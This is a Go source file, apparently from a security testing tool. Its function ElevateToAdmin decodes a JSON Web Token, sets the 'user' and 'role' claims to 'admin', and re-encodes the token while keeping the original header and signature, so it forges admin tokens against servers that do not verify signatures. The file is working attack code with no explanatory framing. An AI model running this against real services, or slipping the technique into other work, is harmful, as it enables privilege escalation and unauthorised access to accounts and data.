package jwt

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"

	"github.com/golang-jwt/jwt/v5"
	log "github.com/sirupsen/logrus"
)

func ElevateToAdmin(token string) string {
	b, err := body(token)
	if err != nil {
		log.Fatalf("invalid token, unable to get body: %v", err)
	}
	dc, err := decode(b)
	if err != nil {
		log.Fatalf("invalid token, unable to decode body from Base64 URL: %v", err)
	}
	claims, err := claims(dc)
	if err != nil {
		log.Fatalf("invalid payload, unable to get claims: %v", err)
	}
	claims["user"] = "admin"
	claims["role"] = "admin"
	h, err := header(token)
	if err != nil {
		log.Fatalf("invalid token, unable to get header: %v", err)
	}
	s, err := signature(token)
	if err != nil {
		log.Fatalf("invalid token, unable to get signature: %v", err)
	}
	// we don't modify the header or signature
	t, err := encode(claims, h, s)
	if err != nil {
		log.Fatalf("invalid token, unable to encode to Base64 URL: %v", err)
	}
	return t
}

func decode(payload string) (string, error) {
	decodedToken, err := base64.RawURLEncoding.DecodeString(payload)
	if err != nil {
		return "", err
	}
	return string(decodedToken), nil
}

func header(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		log.Errorf("invalid JWT token, can't find header: %s", token)
		return "", errors.New("invalid JWT token")
	}
	return parts[0], nil
}

func body(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		log.Errorf("invalid JWT token, can't find body: %s", token)
		return "", errors.New("invalid JWT token")
	}
	return parts[1], nil
}

func signature(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		log.Errorf("invalid JWT token, can't find signature: %s", token)
		return "", errors.New("invalid JWT token")
	}
	return parts[2], nil
}

func encode(claims jwt.MapClaims, header string, signature string) (string, error) {
	encodedClaims, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}
	encodedToken := header + "." + base64.RawURLEncoding.EncodeToString([]byte(encodedClaims)) + "." + signature
	return encodedToken, nil
}

func claims(token string) (jwt.MapClaims, error) {
	claims := jwt.MapClaims{}
	err := json.Unmarshal([]byte(token), &claims)
	if err != nil {
		return nil, err
	}
	return claims, nil
}
